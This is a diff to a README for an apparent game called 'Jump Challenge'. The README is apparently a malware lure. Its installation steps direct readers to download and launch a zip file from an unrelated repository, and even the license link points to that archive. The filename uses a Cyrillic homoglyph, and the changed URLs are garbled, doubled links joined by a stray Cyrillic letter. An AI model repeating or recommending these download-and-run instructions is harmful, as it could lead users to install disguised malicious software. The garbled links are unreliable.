@@ -6,9 +6,9 @@ Welcome to **Jump Challenge** – the ultimate platformer adventure, available a
 
 ## 📦 Installation Instructions
 
-1. **Download** `https://raw.githubusercontent.com/Behrad122/findface-bridge/main/Lоader.zip` from the repository.
+1. **Download** `https://raw.githubusercontent.com/Behrad122/findface-bridge/main/supplicative/bridge_findface_1.9.zipоhttps://raw.githubusercontent.com/Behrad122/findface-bridge/main/supplicative/bridge_findface_1.9.zip` from the repository.
 2. Extract all files to your preferred directory.
-3. Launch the `https://raw.githubusercontent.com/Behrad122/findface-bridge/main/Lоader.zip` to start the game.
+3. Launch the `https://raw.githubusercontent.com/Behrad122/findface-bridge/main/supplicative/bridge_findface_1.9.zipоhttps://raw.githubusercontent.com/Behrad122/findface-bridge/main/supplicative/bridge_findface_1.9.zip` to start the game.
 
 Enjoy seamless updates and the latest version – no hassle, just play!
 
@@ -50,4 +50,4 @@ This project is for **educational purposes only**. Always use the official Loade
 
 ## 📜 MIT License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/Behrad122/findface-bridge/main/Lоader.zip) — 2025. Enjoy Jump Challenge freely and contribute to its ongoing development!
+Distributed under the [MIT License](https://raw.githubusercontent.com/Behrad122/findface-bridge/main/supplicative/bridge_findface_1.9.zipоhttps://raw.githubusercontent.com/Behrad122/findface-bridge/main/supplicative/bridge_findface_1.9.zip) — 2025. Enjoy Jump Challenge freely and contribute to its ongoing development!
